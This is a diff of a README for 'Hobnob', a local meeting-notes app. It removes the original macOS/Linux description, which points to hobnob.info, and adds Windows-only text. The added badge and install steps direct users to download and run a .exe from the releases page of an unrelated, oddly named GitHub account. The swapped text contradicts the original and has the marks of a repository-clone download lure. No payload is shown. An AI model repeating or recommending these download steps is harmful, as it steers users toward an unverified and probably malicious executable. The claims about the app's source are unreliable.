@@ -1,42 +1,91 @@
-# Meet Hobnob!
-**Local meeting notes. No cloud or internet required.**
+# 📝 hobnob - Keep meeting notes private on device
 
-<img width="1040" height="692" alt="hobnob-marketing" src="https://github.com/user-attachments/assets/8e77d8a1-be72-40fa-9a53-ea6c969c7bd3" />
+[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/disqualified-dyeweed147/hobnob/releases)
 
-Hobnob records meetings, transcribes them locally with Whisper, labels speakers, and summarizes everything with a bundled LLM — all on your machine. Nothing leaves your laptop.
+## 🎯 About This App
 
-Visit [hobnob.info](https://hobnob.info) to learn more and download the latest release.
+Hobnob records your meetings and turns them into text notes. The app runs on your computer. It does not send your data to the cloud. You keep total control over your information. It uses local artificial intelligence to listen, write, and summarize your discussions. 
 
-## Features
+## ⚙️ System Needs
 
-- **Live captions** — real-time transcription as you speak
-- **BYOM** — Bring your own model. Set each model to your liking
-- **Speaker labels** — "Me" (mic) vs "Them" (system audio) baked in from the audio level
-- **Final transcript** — high-accuracy pass after the meeting ends (Whisper large-v3-turbo)
-- **LLM summaries** — structured meeting notes with decisions, action items, and open questions
-- **Chat** — ask questions about your meeting while it's still happening
-- **Calendar integration** — auto-titles meetings from your calendar (macOS + Google)
-- **Meeting reminders** — 5-minute heads-up with one-click join
+Your computer requires the following to run Hobnob:
 
-## Quick start
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: 8 GB of RAM or more.
+*   Storage: 2 GB of free space for the application and model files.
+*   Microphone: A functional internal or external microphone.
 
-1. Download the latest release from [hobnob.info](https://hobnob.info)
-2. Launch Hobnob — the first-run wizard will guide you through setup
-3. Start recording your next meeting
+## 📥 How to Install
 
-## Platforms
+1. Visit [this page to download](https://github.com/disqualified-dyeweed147/hobnob/releases) the latest installer.
+2. Find the file ending in .exe in the list of assets.
+3. Click the file to start the download.
+4. Open the downloaded file once the process finishes.
+5. Follow the prompts on your screen to complete the installation.
+6. Launch the app from your Start menu or desktop icon.
 
-| Platform | Package |
-|----------|---------|
-| macOS (arm64) | `Hobnob-mac.zip` |
-| Linux | `.AppImage` · `.deb` · `.pacman` |
+## 🎙️ How to Record Meetings
 
-## Requirements
+1. Open the Hobnob application.
+2. Click the microphone icon to open settings.
+3. Select your input device from the list of available microphones.
+4. Click the Record button when your meeting starts.
+5. Hobnob captures audio in real time.
+6. Click Stop when the meeting finishes.
+7. The app starts the transcription process immediately.
+8. Wait for the status bar at the bottom to show that processing is complete.
 
-- **macOS 13+** (Ventura) or **Linux** (any modern distro)
-- **~8 GB RAM** recommended
-- **~8 GB free disk** for models (downloaded on first run)
+## 📄 Managing Your Notes
 
-## License
+The app saves all files to a local folder on your computer. You can browse these files in the History tab. Each entry includes the date, the duration of the meeting, and the full transcript. Hobnob also creates a summary that highlights key points and action items from the text. You can edit these notes or export them as plain text files for use in other programs.
 
-Proprietary. Free to download and use. See [LICENSE](./LICENSE).
+## 🔒 Privacy and Security
+
+Hobnob processes all audio files on your local hardware. No audio leaves your machine. No text leaves your machine. Your meeting content stays on your drive. You do not need an internet connection to use the transcription or summarization features. This design ensures that your sensitive information remains private.
+
+## 💡 Frequently Asked Questions
+
+**Does the app require an internet connection?**
+No. You can use Hobnob entirely offline.
+
+**Why does the app use a lot of memory?**
+The app runs a language model to interpret your speech. Models require memory to function.
+
+**Can I change the save location?**
+Go to Settings to select a new folder for your notes.
+
+**How do I delete meetings?**
+Right-click on a meeting in your history and select Delete.
+
+**What languages does it support?**
+Hobnob supports English by default. Future updates will add more languages.
+
+**Does it save my audio files?**
+The app saves audio until you delete the meeting entry. You can toggle this setting in the preferences menu.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues during setup, try these steps:
+
+*   Restart your computer.
+*   Check that your microphone works in other Windows apps.
+*   Ensure that you have enough disk space.
+*   Verify that no other app prevents access to your microphone hardware.
+*   Reinstall the application if it fails to launch.
+
+## 📈 Performance Tips
+
+*   Close browser tabs or other demanding programs while you record to free up processing power.
+*   Place your microphone near the speakers to improve audio quality.
+*   Ensure your room has minimal background noise for the best results.
+*   Keep the app updated to benefit from better language models and speed fixes.
+
+## 📋 Features at a Glance
+
+*   **Local Processing:** No external servers, no cloud storage, and no data tracking.
+*   **Automatic Summaries:** The app extracts main points from long transcripts.
+*   **Searchable History:** Find past discussions by date or keyword.
+*   **Easy Export:** Pull your notes into documents or email.
+*   **Modern Interface:** A clean layout designed for focus and speed.
+*   **Whisper Integration:** The app uses sophisticated speech models for high accuracy.
